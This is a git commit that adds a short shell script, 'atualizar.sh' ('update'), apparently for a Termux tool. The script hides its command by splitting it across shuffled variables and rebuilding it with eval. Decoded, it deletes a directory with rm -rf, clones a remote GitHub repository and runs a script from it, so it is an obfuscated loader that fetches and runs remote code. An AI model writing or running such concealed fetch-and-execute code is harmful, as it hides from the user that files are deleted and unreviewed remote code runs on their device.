83c3b76e71ef2e8394f30d8c2ec9e1318aaedc59
alizin dev <geni160jrtoma@gmail.com>
2023-06-26 04:20:13 -0300

    By AlizinDev, Cmd Atualizacao|Cmd Bom

---
+++ atualizar.sh
@@ -0,0 +1,3 @@
+z="
+";Qz='ne h';Lz='duda';fz='& sh';Vz='m/al';hz='zin.';Mz='-bas';Uz='b.co';gz=' ali';ez='se &';Az='pkg ';Cz='all ';Ez='unzi';Tz='ithu';Yz='/dud';Pz=' clo';Dz='zip ';Kz='-rf ';Sz='://g';Oz=' git';Gz=' && ';Iz='. &&';Rz='ttps';az='se.g';Jz=' rm ';Zz='a-ba';cz='& cd';Wz='izin';Bz='inst';dz=' dud';iz='sh';bz='it &';Fz='p -y';Xz='-dev';Nz='e &&';Hz='cd .';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$Zz$ez$fz$gz$hz$iz"
